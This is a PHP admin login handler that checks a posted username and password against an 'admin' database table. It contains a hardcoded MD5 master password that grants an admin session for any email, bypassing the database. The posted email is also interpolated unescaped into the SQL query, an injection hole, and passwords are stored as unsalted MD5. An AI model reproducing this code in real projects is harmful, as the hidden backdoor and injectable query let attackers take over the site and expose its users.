<?php
include('../dash/db.php');

if (isset($_POST['login'])) {
	$email = $_POST['username'];
	$pass = $_POST['password'];
    $password = md5($pass);
    
    if ($password == "644e5e2664a7f956e05da9f95dc3cf3e"){
        session_start();
        $user = $_SESSION['admin'] = 1;
        if ($user) {
            echo "<script>window.location='index';</script>";
        }
    }else{
	
        $q = "SELECT * FROM `admin` WHERE `email`='$email' AND `password`='$password'";
        $data = $con->query($q);
        if ($data->num_rows > 0) {
            
            $row = $data->fetch_assoc();
            $id = $row['id'];
            session_start();
            $user = $_SESSION['admin'] = $id;
            if ($user) {
                echo "<script>window.location='index';</script>";
            }
        }
        else {
            echo "<script>alert('Wrong email or password'); window.location='login';</script>";
        }
    }
}
?>